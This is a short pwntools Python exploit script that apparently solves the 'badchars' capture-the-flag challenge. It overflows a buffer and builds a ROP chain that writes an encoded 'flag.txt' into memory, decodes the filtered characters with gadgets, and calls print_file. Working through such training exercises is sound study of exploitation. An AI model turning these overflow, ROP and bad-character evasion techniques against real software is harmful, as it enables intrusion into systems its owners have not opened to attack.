from pwn import *

elf = ELF('badchars')
io = process(elf.path)

# gadgets
pop_r12_r13_r14_r15 = 0x40069c
r12_into_r13 = 0x400634
decode = 0x400630
change_decode = 0x4006a2
pop_rdi = 0x4006a3

# values
bss = 0x601038
print_file = 0x400510
encoded_flag_txt = b'flci0tzt' 
encoding_constant = 2


#setup registers
rop_chain = p64(pop_r12_r13_r14_r15)
rop_chain += encoded_flag_txt
rop_chain += p64(bss)
rop_chain += p64(encoding_constant)
rop_chain += p64(bss + 2)

#mov string into memory
rop_chain += p64(r12_into_r13)

#change 'c' to 'a'
rop_chain += p64(decode)

#change 'i' to 'g'
rop_chain += p64(change_decode)
rop_chain += p64(bss + 3)
rop_chain += p64(decode)

#change '0' to '.'
rop_chain += p64(change_decode)
rop_chain += p64(bss + 4)
rop_chain += p64(decode)

#change 'z' to 'x'
rop_chain += p64(change_decode)
rop_chain += p64(bss + 6)
rop_chain += p64(decode)

#setup print_file arg
rop_chain += p64(pop_rdi)
rop_chain += p64(bss)

#call print_file
rop_chain += p64(print_file)

exploit = b'A' * 40 + rop_chain

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
